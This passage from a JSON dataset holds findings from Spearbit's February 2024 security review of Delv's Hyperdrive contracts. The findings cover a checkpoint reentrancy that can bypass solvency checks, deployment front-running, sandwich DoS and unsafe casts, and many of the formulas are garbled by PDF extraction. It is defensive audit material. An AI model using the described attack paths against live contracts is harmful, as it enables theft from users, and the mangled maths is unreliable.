        "body": "Most public functions of Hyperdrive have reentrancy guards but the checkpoint function does not. It can change important contract state like reserves. This can interfere with other functions that don't expect state to change during a _deposit call. For example, the following call StEthHyperdrive.openShort -> _openShort -> _deposit performs a refund that happens in the middle of the openShort function. It then continues execution with the _applyShort function. One could re-enter checkpoint during _deposit to apply a checkpoint, changing the market state. This allows calculating a swap that would violate solvency requirements but can pass as solvency is only checked after _- It is also possible that after the market state is updated in _applyCheckpoint there would be some deposit. excess idle to be distributed. If so the curve C is scaled down to (cid:21)C. But when we call _applyOpenShort the inputs are from the deltas calculated when we traded on C and not (cid:21)C which might push our point (z, (cid:16), y ) further to the right (not past the solvency or minimum line but more than the amount it should).",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The _distributeExcessIdle is not called when zombie interest is collected",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "When a position is closed by a checkpoint at maturity but the user does not close it, it can accumulate interest accordingly with the Zombie Interest algorithm. The positive interest that is accumulated is added to the share reserves HyperdriveBase.sol#L401. This can create excess idle that should be distributed at the current share price.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The derivative in calculateMaxBuyBondsOutDerivativeSafe is not calculated correctly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The derivative in calculateMaxBuyBondsOutDerivativeSafe is not calculated correctly. Let: 1 1 (cid:0) ts (cid:0) y net curve where K is: F (z) = dymax (z) = y (cid:0) K c (cid:22) + 1 12 K = c ((cid:22)(z (cid:0) (cid:16)))1(cid:0)ts + y 1(cid:0)ts (cid:22) dF dz = dy dz (cid:0) 1 1 (cid:0) ts K c (cid:22) + 1 dK dz = (1 (cid:0) ts) (cid:1) c((cid:22)(z (cid:0) (cid:16)))(cid:0)ts (1 (cid:0) d(cid:16) dz ) + y (cid:0)ts dy dz So we have: ts 1 (cid:0) ts dK dz c (cid:22) + 1 and so we have: c((cid:22)(z (cid:0) (cid:16)))(cid:0)ts (1 (cid:0) d(cid:16) dz ) + y (cid:0)ts dy dz c (cid:22) + 1 ts 1 (cid:0) ts or: dF dz = dy dz (cid:0) K c (cid:22) + 1 dF dz = 1 (cid:0) d(cid:16) dz ts 1 (cid:0) ts dy dz (cid:0) d(cid:16) (cid:0) K c (cid:22) + 1 c((cid:22)(z (cid:0) (cid:16)))(cid:0)ts + y (cid:0)ts dy dz (cid:0) d(cid:16) c (cid:22) + 1 and since this derivative calculate using scaling of the variables: we would have: (z, (cid:16), y ) ! z + dz z (z, (cid:16), y ) dy dz = d(cid:16) dz = y z (cid:16) z 13 and so dF dz = 1 (cid:0) (cid:16) z ts 1 (cid:0) ts y z (cid:0) (cid:16) (cid:0) K c (cid:22) + 1 c((cid:22)(z (cid:0) (cid:16)))(cid:0)ts + y (cid:0)ts y z (cid:0) (cid:16) c (cid:22) + 1 But the implemented/calculated derivative in the codebase is: 1 (cid:0) (cid:16)og zog ts 1 (cid:0) ts yog zog (cid:0) (cid:16)og (cid:0) K c (cid:22) + 1 c((cid:22)(z (cid:0) (cid:16)))(cid:0)ts + y (cid:0)ts yog zog (cid:0) (cid:16)og c (cid:22) + 1 which is a mix of formulas for derivative of F at point z and zog.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Solvency is not checked during the excess idle distribution when the netCurveTrade is 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Solvency is not checked during the excess idle distribution when the netCurveTrade is 0. In calculateDistributeExcessIdle if netCurveTrade is 0 we would have: also in this case we would have: (cid:1)zmax = I(orzidle) PV0 = z (cid:0) Lo (cid:0) So c (cid:0) zmin = I + Lexp (cid:0) (Lo (cid:0) So) c = I + tm2B max(0, sS,tm (cid:0) sL,tm ) c P 14 and after updating the liquidity by removing (cid:1)zmax = I we would have: and the withdrawalSharesRedeemed is calculated as: PV1 = P tm2B max(0, sS,tm (cid:0) sL,tm ) c (cid:1)sw = (sLP + sw ) I PV0 Now if we end up in the else branch of: if (withdrawalSharesRedeemed == 0) { return (0, 0); } else if (withdrawalSharesRedeemed <= _params.withdrawalSharesTotalSupply) { return ,! else { withdrawalSharesRedeemed = _params.withdrawalSharesTotalSupply; } (withdrawalSharesRedeemed, maxShareReservesDelta); } We know that: (cid:1)sw = (sLP + sw ) I PV0 > sw and so calculateDistributeExcessIdleShareProceeds would return the following as shareProceeds since netCurveTrade is 0: PV0 and we need to check: PV0 (cid:20) I (cid:1)z = sw sLP + sw (cid:1)z = sw sLP + sw But the above inequality can be derived from the inequality we got from the else branch, unless due to some division errors the inequality's direction would flip.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "calculateUpdateLiquidity does not check to make sure the effective share reserves ze is not below the minimum threshold",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "In calculateUpdateLiquidity one is scaling the point (z, (cid:16), y ) by the provided delta of share re- serves: The following check is included in the implantation: (z, (cid:16), y) (cid:0)! z + (cid:1)z z (z, (cid:16), y ) But the following check is missing: z + (cid:1)z (cid:21) zmin z + (cid:1)z z (z (cid:0) (cid:16)) (cid:21) zmin",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Fees are incorporated differently depending on the endpoint called",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The focus of this issue is on the LP/curve fee and the related governance fees when one opens or closes long or short positions. The governance zombie fee is not discussed. All bonds are assumed to be freshly minted on the curve and are fully non-matured. endpoint unit Lo So Lc Sc [y] [z] [z] [z] tr 1 1 tr tr fc $\\phi_c \\space\\Big( \\cfrac{1}{p_{spot}}- 1 \\Big) \\Big( c \\space \\Delta z \\Big) $ $\\phi_c \\Big( \\cfrac{1}{p_{spot}}- 1 \\Big)p_{spot} \\Big( \\cfrac{| t_r \\Delta y |}{c} \\Big) $ $\\phi_c \\Big( \\cfrac{1}{p_{spot}}- 1 \\Big)p_{spot} \\Big( \\cfrac{| t_r \\Delta y |}{c} \\Big) $ $\\phi_c \\Big( \\cfrac{1}{p_{spot}}- 1 \\Big)p_{spot} \\Big( \\cfrac{| t_r \\Delta y |}{c} \\Big) $ ff 0 (cid:30)f (cid:30)f (cid:30)f (1 (cid:0) tr )jdy j c (1 (cid:0) tr )jdy j c (1 (cid:0) tr )jdy j c fg,c fg,f fg,t (cid:30)gfc (cid:30)gff (unit [z] ) fg,cpspot c (cid:30)gfc (cid:30)gff (cid:30)g(fc + ff ) (cid:30)gfc (cid:30)gff (cid:30)g(fc + ff ) (cid:30)gfc (cid:30)gff (cid:30)g(fc + ff ) In the above, we haven't included the scaling factor for Lc and Sc due to a drop in the price per vault share min(1, cclose copen ) 1. Basically, when calculating fc we take a (cid:30)c portion of the fixed interest rate at the end of the position duration. These formulas are not so accurate since the the value of the position at the end of the term is known to be tr (cid:1)y and the principal paid for it is also known which is c(cid:1)z, so the fixed interest is: So we could have had: tr (cid:1)y (cid:0) c(cid:1)z endpoint unit Lo So Lc Sc [y] [z] [z] [z] tr 1 1 tr tr fc (cid:30)c(tr (cid:1)y (cid:0) c(cid:1)z) (cid:30)c(tr (cid:1)y (cid:0) c(cid:1)z)=c (cid:30)c(tr (cid:1)y (cid:0) c(cid:1)z)=c (cid:30)c(tr (cid:1)y (cid:0) c(cid:1)z)=c 17 2. endpoint curve point after the trade vector of LP fees added to the resultant point vector of fees added to the resultant point Lo Lc So Sc (ze + (cid:1)z, y (cid:0) tr (cid:1)y ) (ze (cid:0) (cid:1)z, y + tr (cid:1)y ) (ze (cid:0) (cid:1)z, y + tr (cid:1)y ) (ze + (cid:1)z, y (cid:0) tr (cid:1)y ) (0, fc) (fc, 0) (fc, 0) (fc, 0) ((cid:0) (cid:30)gfcpspot c (fc, 0) , (1 (cid:0) (cid:30)g)fc) ((1 (cid:0) (cid:30)g)fc, 0) ((1 (cid:0) (cid:30)g)fc, 0)",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "After trading on the curve in openLong and applying the fees, spot price is not check to make sure it is still not greater than 1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "In _calculateOpenLong when one trades on the curve and applies the pool and governance fees, we don't check whether the spot price is still below 1. Previous reviewed revision had the following check after calculating the deltas: // If the ending spot price is greater than or equal to 1, we are in the // negative interest region of the trading function. The spot price is // given by ((mu * z) / y) ** tau, so all that we need to check is that // (mu * z) / y < 1 or, equivalently, that mu * z >= y. if ( _initialSharePrice.mulDown( _marketState.shareReserves + shareReservesDelta ) >= _marketState.bondReserves - bondReservesDelta ) { } revert Errors.NegativeInterest(); The current version of HypderdriveLong only checks an upper bound for the spot price after trading on the curve (before applying the fees) to make sure the purchased bonds would not bear negative interest: (cid:22)(z (cid:0) (cid:16) + (cid:1)z) y + (cid:1)y ts (cid:20) 1 + (cid:30)c( (1 (cid:0) (cid:30)f ) 1 pspot (cid:0) 1)(1 (cid:0) (cid:30)f ) (cid:20) 1 Note that the far right inequality is guaranteed if the spot price before trading on the curve pspot (cid:20) 1. But we also need to make sure the spot price stays not above 1 when fees are included: (cid:22)(z (cid:0) (cid:16) + (cid:1)z (cid:0) (cid:30)gpspot c fc) y + (cid:1)y + (1 (cid:0) (cid:30)g)fc ts (cid:20) (cid:22)(z (cid:0) (cid:16) + (cid:1)z) y + (cid:1)y ts (cid:20) 1 Thus the required inequality after applying the fees should be true, unless due to pow not being monotone, the left inequality above would not hold and the spot price after applying the fees would jump above 1.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The negative interest check for non-matured bonds in _calculateCloseShort is not entirely accurate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "When closing a short the non-matured portion of the (cid:1)y , ie tr (cid:1)y gets minted for the pool and the trader would need to pay the pool the following amount of base: (cid:1)xtotal = max(0, cclose copen + (cid:30)f (cid:1)y (cid:0) (1 (cid:0) tr )(1 + (cid:30)f )(cid:1)y + c1(cid:1)zcurve + (cid:30)c(1 (cid:0) pspot )tr (cid:1)y )(cid:21) where (cid:21) is: (cid:21) = min(1, cclose copen ) min(1, c1zzombie xzombie ) So ignoring (cid:21) and the max function we have: (cid:1)y (cid:0) (1 (cid:0) tr )(1 + (cid:30)f )(cid:1)y + c1(cid:1)zcurve + (cid:30)c(1 (cid:0) pspot )tr (cid:1)y (cid:1)xtotal = cclose copen + (cid:30)f So for closing the non-matured portion of the bond, the trader would need to pay back the pool the following amount of base which is why it is subtracted above: c1(cid:1)zcurve + (cid:30)c(1 (cid:0) pspot )tr (cid:1)y assuming that this is like minting a new bond in the amount of tr (cid:1)y, at maturity it should have the base value of tr (cid:1)y so for this portion of the bond to be not bearing negative interests we need to have (below we are assuming no flat fees are taken from tr (cid:1)y at maturity since the trader happens from the LP pool to itself): Then: c1(cid:1)zcurve + (cid:30)c(1 (cid:0) pspot )tr (cid:1)y (cid:20) tr (cid:1)y 20 c1(cid:1)zcurve tr (cid:1)y (cid:20) 1 (cid:0) (cid:30)c(1 (cid:0) pspot ) Note that when closing a short first we trade on the curve the non-matured portion then we do the flat trade for the matured portion of the bonds. Again like opening longs, since our curve is a convex curve and we have: ts (cid:20) c1(cid:1)zcurve tr (cid:1)y (cid:20) (cid:22)(z (cid:0) (cid:16) + (cid:1)zcurve) y (cid:0) tr (cid:1)y ts So checking: ts (cid:20) 1 (cid:0) (cid:30)c(1 (cid:0) pspot ) implies: There are a few issues: (cid:22)(z (cid:0) (cid:16)) y (cid:22)(z (cid:0) (cid:16) + (cid:1)zcurve) y (cid:0) tr (cid:1)y c1(cid:1)zcurve tr (cid:1)y (cid:20) 1 (cid:0) (cid:30)c(1 (cid:0) pspot ) 1. The below inequality might not always be true due to errors in calculations of functions like pow: c1(cid:1)zcurve tr (cid:1)y (cid:20) (cid:22)(z (cid:0) (cid:16) + (cid:1)zcurve) y (cid:0) tr (cid:1)y ts 2. In general, since at this stage (cid:21) can be calculated one should in total generality check: We have (cid:21) (cid:20) 1 so the checked inequality without (cid:21) is actually more strict: c1(cid:1)zcurve tr (cid:1)y (cid:20) 1 (cid:21) (cid:0) (cid:30)c(1 (cid:0) pspot ) c1(cid:1)zcurve tr (cid:1)y (cid:20) 1 (cid:0) (cid:30)c(1 (cid:0) pspot ) (cid:20) 1 (cid:21) (cid:0) (cid:30)c(1 (cid:0) pspot )",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The negative interest check for non-matured bonds in _calculateOpenLong is not entirely accurate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "In this context, we actually want to enforce: where (cid:21) is: c0(cid:1)z (cid:0)(cid:1)y = (cid:1)x (cid:0)(cid:1)y (cid:20) (1 (cid:0) (cid:30)f )(cid:21) 1 pspot (cid:0) 1)(1 (cid:0) (cid:30)f )(cid:21) 1 + (cid:30)c( (cid:21) = min(1, cclose copen ) min(1, c1zzombie xzombie ) But since (cid:21) depends on some to-be-determined parameters in the future, one cannot use it for the check here. So we need to at least check assuming no negative interest on the vault side and also on the zombie interest side: c0(cid:1)z (cid:0)(cid:1)y = (cid:1)x (cid:0)(cid:1)y (cid:20) (1 (cid:0) (cid:30)f ) 1 pspot (cid:0) 1)(1 (cid:0) (cid:30)f ) 1 + (cid:30)c( But here we are instead checking the slope of the scaled perpendicular line at the resultant point (z (cid:0) (cid:16) + (cid:1)z, (cid:1)y ). This is fine since our curve is a convex curve and we have: (cid:22)(z (cid:0) (cid:16)) y ts (cid:20) (cid:1)x (cid:0)(cid:1)y (cid:20) (cid:22)(z (cid:0) (cid:16) + (cid:1)z) y + (cid:1)y ts Note that when opening a long our reserve point moves to the right of the diagram. So enforcing: (cid:22)(z (cid:0) (cid:16) + (cid:1)z) y + (cid:1)y 22 ts (cid:20) 1 + (cid:30)c( (1 (cid:0) (cid:30)f ) 1 pspot (cid:0) 1)(1 (cid:0) (cid:30)f ) would imply: c0(cid:1)z (cid:0)(cid:1)y = (cid:1)x (cid:0)(cid:1)y (cid:20) (1 (cid:0) (cid:30)f ) 1 pspot (cid:0) 1)(1 (cid:0) (cid:30)f ) 1 + (cid:30)c( Although this a great check to perform it would still not protect the user from negative interests stemming from the vault share price or zombie interest calculations (cid:21). But still, there is a small issue. Due to errors in the pow functions or other arithmetic errors in divisions the following inequality might not hold in general: (cid:1)x (cid:0)(cid:1)y (cid:20) (cid:22)(z (cid:0) (cid:16) + (cid:1)z) y + (cid:1)y ts",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Front-running when deploying an instance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The desired deployment process goes through several contracts: Factory ! Coordinator ! In- stanceCoreDeployer. It's important that the transaction can't be made to fail at any of these levels, as it would cause a failed deployment in the upper levels. They can be made to fail if the subset of parameters that are used for the deployment call can be re-used by a different party: 1. Front-running any StETHTarget01234Deployer.deploy(config, extraData, salt): Anyone can front-run this by choosing the exact same parameters. The victim transaction will fail. We can fix this by binding one of the parameters used in create2 to the msg.sender. _salt is the most natural one: _salt = keccak256(salt, msg.sender). new StETHTarget0{ salt: _salt }(_config, lido) 23 2. Front-running StETHHyperdriveCoreDeployer.deploy(config, extraData, target0, target1, target2, target3, target4, salt): Same case as 1): Anyone can fron-trun this by choosing the exact same parameters. The victim transaction will fail. any We can fix this by binding one of the parameters used in create2 to the msg.sender. _salt is the most natural one: _salt = keccak256(salt, msg.sender). new StETHHyperdrive{ salt: _salt }( _config, target0, target1, target2, target3, target4, lido ) 3. Front-running any HyperdriveDeployerCoordinator.deployTarget(deploymentId, deployConfig, extraData, targetIndex, salt): != deploymentId but otherwise the exact same parameters. Because the deployment-relevant call ignores the deploymentId: Anyone can front-run this by choosing deploymentId  target = IHyperdriveTargetDeployer(target0Deployer).deploy( config_, _extraData, _salt ); We can fix this by binding one of these parameters to the msg.sender. We also need to bind it to deploy- mentId to make it part of the deployment-relevant parameters (important for preventing factory deployment collisions). _salt is the most natural one: _salt = keccak256(salt, msg.sender, deploymentId).",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk HyperdriveDeployerCoordinator.sol#L155,"
        ]
    },
    {
        "title": "calculateSharesOutGivenBondsInDownSafe succeeds even if it should fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "In the last step of calculateSharesOutGivenBondsInDownSafe, ze - z is computed. The function should fail if ze < z. However, it still succeeds with a return value of 0. if (ze > _z) { result = ze - _z; } success = true;",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unsafe type casts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "When type-casting from a type with a larger range to a type with a smaller range, Solidity truncates any bits that exceed the new range instead of reverting. This silent truncation can lead to unexpected errors. The following code performs truncated type-casts:  There are 56 int256 casts from types with a higher input range throughout the code base in Hyperdrive- Base, HyperdriveCheckpoint, HyperdriveLong, HyperdriveLP, HyperdriveShort, FixedPointMath, Hy- perdriveMath, LPMath.  Two int128 casts from types with a higher input range: HyperdriveBase.sol#L277, Hyperdrive- Base.sol#L402.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Wrong conditional in calculateSharesInGivenBondsOutDerivativeSafe",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The calculateSharesInGivenBondsOutDerivativeSafe function checks if (inner >= 0) but in- ner is an unsigned integer, therefore this conditional is always true.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Non-matued shorts might no be able to close because of the netting feature",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "A correctly implemented long , shorts netting feature per checkpoint will check that the protocol is still solvent when closing netted, non-matured shorts. This can lead to a DoS for non-matured closeShort calls by frontrunning it by taking out the max long. Even if not malicious, the protocol can be in a state of low excess idle reserves as idle reserves are regularly removed through the withdrawal shares conversion process.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_minOutputPerShare compared against both base and vault share amounts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The _minOutputPerShare parameter in _redeemWithdrawalSharesInternal is defined as: _minOutputPerShare The minimum amount of base the LP expects to receive for each withdrawal share that is burned. It is compared against the withdrawn proceeds in _minOutputPerShare.mulUp(withdrawalSharesRedeemed) > proceeds. However, proceeds can be either a base or vault shares amount, depending on the withdrawal _- options.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "addLiquidity with minApr/maxApr can be DoS'd",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The _addLiquidity function reverts if the APR is out of the _minApr/_maxApr bounds. It's possible for an attacker to sandwich the addLiquidity transaction with trades that move the APR out of this range (and back-run to undo this trade), making the liquidity provisioning revert.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Fixed _minimumTransactionAmount is used for shares that grow in value, pricing out users",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The _minimumTransactionAmount is compared against amounts of all types: base, vault shares, LP shares, bonds. The vault shares and LP shares will usually grow in value so the minimum transaction amount for these will also grow in value over time. Users might be priced out as the minimum transaction amount's value increases.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Wrong minimumTransactionAmount verification",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "minimumShareReserves twice. The ERC4626HyperdriveDeployerCoordinator._checkPoolConfig function checks the",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Factory's deployment config parameters should be explicit about its values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The deployAndInitialize and deployTarget functions accept a _config parameter. Its linker- Factory, linkerCodeHash, feeCollector, governance values are taken from the contract's current storage values. It can happen that a change to one of these contracts happens before the deploy* transaction and the deployer ends up using unexpected values.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "deployAndInitialize flow decision is incorrectly made using msg.value rather than baseToken",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "When calling deployAndInitialize, the logic to determine the use of ETH versus ERC20 tokens is currently based on the following check: if (msg.value >= _contribution) { This piece of code is comparing msg.value included within the call with the contribution amount. This approach can lead to some reverts and unexpected behavior, as when msg.value is greater or equal to the contribution, the contract assumes payment in ETH regardless of the baseToken setting. Conversely, if the baseToken is ETH (0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), but msg.value is less than the contribution, the contract attempts to process the payment as an ERC20 transaction, which will fail. Change the logic the ETH placeholder",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "toString can use an auxiliary function to avoid manual repetition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "toString some sort of do-while mechanism, that can be refactored into an auxiliary function for clarity. Additionally, it would improve gas usage:  Snapshots result: Overall gas change: -49959657 (-0.417%)",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Deriving maxShareReservesDelta in calculateDistributeExcessIdle can be simplified using a scal- ing trick",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Assume the pool is net short since in the net long case we would just return the idle share amount. Let: 1 1 (cid:0) ts (cid:0) y net curve where K is: F (z) = dymax (z) = y (cid:0) K c (cid:22) + 1 29 K = c ((cid:22)(z (cid:0) (cid:16)))1(cid:0)ts + y 1(cid:0)ts (cid:22) F (z) is the function that calculates the maximum amount of bonds that can be taken away from the pool's curve while still guaranteeing that the net shorts can be closed. This is the function used in the optimization problem using Newton's method to find the maximum amount of share reserves that can be taken from the pool while still being able to close the net shorts on the updated curve. So we have: ts 1 (cid:0) ts dK dz c (cid:22) + 1 and so we have: dF dz = dy dz (cid:0) 1 1 (cid:0) ts K c (cid:22) + 1 dK dz = (1 (cid:0) ts) (cid:1) c((cid:22)(z (cid:0) (cid:16)))(cid:0)ts (1 (cid:0) d(cid:16) dz ) + y (cid:0)ts dy dz dF dz = dy dz (cid:0) K c (cid:22) + 1 dF dz = dy dz (cid:0) K ts c (cid:22) + 1 c((cid:22)(z (cid:0) (cid:16)))(cid:0)ts (1 (cid:0) d(cid:16) dz ) + y (cid:0)ts dy dz c (cid:22) + 1 ts 1 (cid:0) ts or 1 1 (cid:0) ts c((cid:22)(z (cid:0) (cid:16)))(cid:0)ts (1 (cid:0) d(cid:16) dz ) + y (cid:0)ts dy dz Now note that before calling calculateMaxBuyBondsOutDerivativeSafe one calls: 1. calculateUpdateLiquidity which scales our points (in our calculations dz has a negative value, in the implementation the absolute value of it is used): and so we get: (zog, (cid:16)og, yog) ! zog + dz zog (zog, (cid:16)og, yog) 30 d(cid:16) dz dy dz = = (cid:16)og zog yog zog The above are just rough discrete approximations of the actual derivatives. 2. calculateMaxBuyBondsOut and calculateMaxBuyBondsOutDerivativeSafe use these scaled values for (z, (cid:16), y ). So replacing these approximate derivates above we get: dF dz = yog zog (cid:0) K ts c (cid:22) + 1 1 1 (cid:0) ts c((cid:22)(z (cid:0) (cid:16)))(cid:0)ts (1 (cid:0) (cid:16)og zog ) + y (cid:0)ts yog zog If we simplify the calculation in calculateMaxBuyBondsOutDerivativeSafe we would also get the same result up to rounding errors and the delta underflow check. All this is done so that one can use the Newton method to approximate the zero of F (z): zi+1 = zi (cid:0) F (z) F 0(z) Scaling Since approximate derivation calculation is performed by scaling our points in calculateUpdateLiquidity , one can use a different approach: ie, the derivation is not performed in the direction of z but the direction of the ray connecting (z, (cid:16), y) to the origin. (zog, (cid:16)og, yog) ! (cid:21)(zog, (cid:16)og, yog) Define: 1 1 (cid:0) ts G(z, (cid:16), y ) = y (cid:0) K c (cid:22) + 1 and note that F is actually a function of 3 dependant parameters F (z, (cid:16), y) and so we have: and and so let's define: F (z, (cid:16), y ) = G(z, (cid:16), y ) (cid:0) y net curve F ((cid:21)z, (cid:21)(cid:16), (cid:21)y ) = (cid:21)G(z, (cid:16), y ) (cid:0) y net curve 31 then we have: and so by Newton's formula, we get: f ((cid:21)) = F ((cid:21)zog, (cid:21)(cid:16)og, (cid:21)yog) f 0((cid:21)) = G(zog, (cid:16)og, yog) (cid:21)i+1 = (cid:21)i (cid:0) f ((cid:21)i ) f 0((cid:21)) = y net curve G(zog, (cid:16)og, yog) Which was also obvious from the scaling properties of G one could have solved for the root of f directly, the root being: (cid:21)(cid:3) = y net curve G(zog, (cid:16)og, yog) Therefore Newton's method is actually not needed one can first derive the scaling factor (cid:21)(cid:3) and use that to find: dzmax = ((cid:21)(cid:3) (cid:0) 1)zog Note that in the implementation you would use the negated value of the above formula since you use work with the absolute values.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The rhs scaling in calculateMaxShareReservesDeltaInitialGuess can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Not considering the different rounding errors the current computation in this context is: r yog(1 (cid:0) (cid:16)og=zog) zog (cid:0) (cid:16)og = r (cid:1) zog yog",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Duplicate condition check in shouldShortCircuitDistributeExcessIdleShareProceeds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The shouldShortCircuitDistributeExcessIdleShareProceeds function performs the following checks: if (lpSharePriceAfter < lpSharePriceBefore) { return false; } return lpSharePriceAfter >= lpSharePriceBefore && lpSharePriceAfter <= // NOTE: Round down to make the check stricter. lpSharePriceBefore.mulDown(ONE + SHARE_PROCEEDS_MIN_TOLERANCE); However, the lpSharePriceAfter < lpSharePriceBefore condition & return false is already covered by the lpSharePriceAfter >= lpSharePriceBefore && ... that follows.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Calculation can be omitted in case of ONE == derivative",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "We can see how the code includes an if/else block, where in the case (ONE >= derivative) it calculates the derivative, otherwise it fast returns (0, true). However, this approach is redundant for ONE == derivative, resulting in unnecessary operations since derivative = ONE - ONE simplifies to 0, and subsequent calculations yield the same outcome. // derivative = 1 - derivative if (ONE >= derivative) { derivative = ONE - derivative; } else { // NOTE: Small rounding errors can result in the derivative being // slightly (on the order of a few wei) greater than 1. In this case, // we return 0 since we should proceed with Newton return (0, true); s method.  } // ... // NOTE: Round down to round the final result down. // /// derivative = derivative * (1 - (zeta / z)) // ... return (derivative, true); //@audit so in that case is performed a multiplication by 0 and returned (0, ,! true)",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unused name returns affect readability and gas usage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Through the codebae, there are multiple instances of named returns not being used, i.e. being declared but later explicitly returning those variables or a mixed statement where, for example, 3 named return variables are declared, but later explicitly only 2 of the 3 are returned. Removing unused named return variables can reduce gas usage and improve code clarity.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Caching storage variables to save SLOADs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "When a storage variable is used several times within the same scope, it is more efficient to cache it for the subsequent reads rather than directly reading from storage, as this implies unnecessary executions of the SLOAD instruction.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unchecked arithmetic can be used for gas optimizations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
